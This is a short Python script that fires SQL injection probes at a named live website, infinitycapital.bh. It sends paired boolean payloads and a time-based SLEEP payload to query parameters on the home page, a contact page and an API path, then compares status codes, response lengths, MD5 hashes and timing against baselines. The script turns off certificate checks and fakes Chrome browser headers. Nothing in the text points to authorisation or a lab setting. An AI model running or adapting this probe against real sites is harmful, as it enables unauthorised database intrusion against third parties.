import urllib.request, urllib.parse, hashlib, time, ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
H={'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome Safari/537.36',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
'Accept-Language':'en-US,en;q=0.9','Accept-Encoding':'identity','Upgrade-Insecure-Requests':'1',
'Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1',
'sec-ch-ua':'Chromium','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'macOS'}
def get(u):
    try:
        r=urllib.request.urlopen(urllib.request.Request(u,headers=H),timeout=30,context=ctx)
        b=r.read(); return r.status,len(b),hashlib.md5(b).hexdigest()
    except urllib.error.HTTPError as e:
        b=e.read(); return e.code,len(b),hashlib.md5(b).hexdigest()
    except Exception as e: return 'ERR',0,str(e)[:40]
pairs=[("https://www.infinitycapital.bh/","page","2","BASE-A"),
 ("https://www.infinitycapital.bh/","page","2' AND 1=1-- -","TRUE"),
 ("https://www.infinitycapital.bh/","page","2' AND 1=2-- -","FALSE"),
 ("https://www.infinitycapital.bh/","page","2","BASE-B"),
 ("https://www.infinitycapital.bh/","page","2' AND SLEEP(6)-- -","SLEEP"),
 ("https://www.infinitycapital.bh/","page","2","BASE-C"),
 ("https://www.infinitycapital.bh/contact","cb","1' AND 1=1-- -","C-TRUE"),
 ("https://www.infinitycapital.bh/contact","cb","1' AND 1=2-- -","C-FALSE"),
 ("https://www.infinitycapital.bh/api/","id","1' AND 1=1-- -","A-TRUE"),
 ("https://www.infinitycapital.bh/api/","id","1' AND 1=2-- -","A-FALSE")]
for base,p,v,label in pairs:
    u=base+"?"+urllib.parse.urlencode({p:v})
    t0=time.time(); r=get(u); dt=time.time()-t0
    print("%-8s %-24r -> %s len=%s md5=%s t=%.2f" % (label,v,r[0],r[1],r[2][:12],dt))
    time.sleep(2)
